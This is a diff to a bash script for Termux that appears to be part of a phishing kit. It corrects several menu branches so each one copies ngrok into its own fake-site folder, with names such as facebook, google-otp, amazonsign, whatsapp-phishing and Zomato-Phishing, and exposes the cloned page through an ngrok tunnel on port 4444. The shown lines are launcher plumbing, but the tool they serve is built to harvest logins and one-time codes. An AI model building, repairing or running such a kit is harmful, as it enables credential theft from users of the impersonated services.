@@ -96,8 +96,8 @@ echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
 		  
 		   cd $HOME
-                           cp  ngrok /data/data/com.termux/files/home/sites/tiktok
-                           cd /data/data/com.termux/files/home/sites/tiktok
+                           cp  ngrok /data/data/com.termux/files/home/sites/facebook
+                           cd /data/data/com.termux/files/home/sites/facebook
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
@@ -121,8 +121,8 @@ echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
 		  
 		  cd $HOME
-                           cp  ngrok /data/data/com.termux/files/home/sites/tiktok
-                           cd /data/data/com.termux/files/home/sites/tiktok
+                           cp  ngrok /data/data/com.termux/files/home/sites/instagram
+                           cd /data/data/com.termux/files/home/sites/instagram
 		  
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
@@ -192,8 +192,8 @@ echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
 		  
 		   cd $HOME
-                           cp  ngrok /data/data/com.termux/files/home/sites/tiktok
-                           cd /data/data/com.termux/files/home/sites/tiktok
+                           cp  ngrok /data/data/com.termux/files/home/sites/google-otp
+                           cd /data/data/com.termux/files/home/sites/google-otp
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
@@ -291,8 +291,8 @@ echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
 		  
 		   cd $HOME
-                           cp  ngrok /data/data/com.termux/files/home/sites/tiktok
-                           cd /data/data/com.termux/files/home/sites/tiktok
+                           cp  ngrok /data/data/com.termux/files/home/sites/instafollow
+                           cd /data/data/com.termux/files/home/sites/instafollow
 		  
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
@@ -315,8 +315,8 @@ echo ""
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
 		   cd $HOME
-                           cp  ngrok /data/data/com.termux/files/home/sites/tiktok
-                           cd /data/data/com.termux/files/home/sites/tiktok
+                           cp  ngrok /data/data/com.termux/files/home/sites/amazonsign
+                           cd /data/data/com.termux/files/home/sites/amazonsign
 		  
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
@@ -339,8 +339,8 @@ echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
 		  
 		   cd $HOME
-                           cp  ngrok /data/data/com.termux/files/home/sites/tiktok
-                           cd /data/data/com.termux/files/home/sites/tiktok
+                           cp  ngrok /data/data/com.termux/files/home/sites/whatsapp-phishing
+                           cd /data/data/com.termux/files/home/sites/whatsapp-phishing
 		  
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
@@ -464,8 +464,8 @@ echo ""
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
 		   cd $HOME
-                           cp  ngrok /data/data/com.termux/files/home/sites/tiktok
-                           cd /data/data/com.termux/files/home/sites/tiktok
+                           cp  ngrok /data/data/com.termux/files/home/sites/Zomato-Phishing
+                           cd /data/data/com.termux/files/home/sites/Zomato-Phishing
 		  
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
@@ -529,8 +529,8 @@ echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
 		  
 		   cd $HOME
-                           cp  ngrok /data/data/com.termux/files/home/sites/tiktok
-                           cd /data/data/com.termux/files/home/sites/tiktok
+                           cp  ngrok /data/data/com.termux/files/home/sites/telegram
+                           cd /data/data/com.termux/files/home/sites/telegram
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
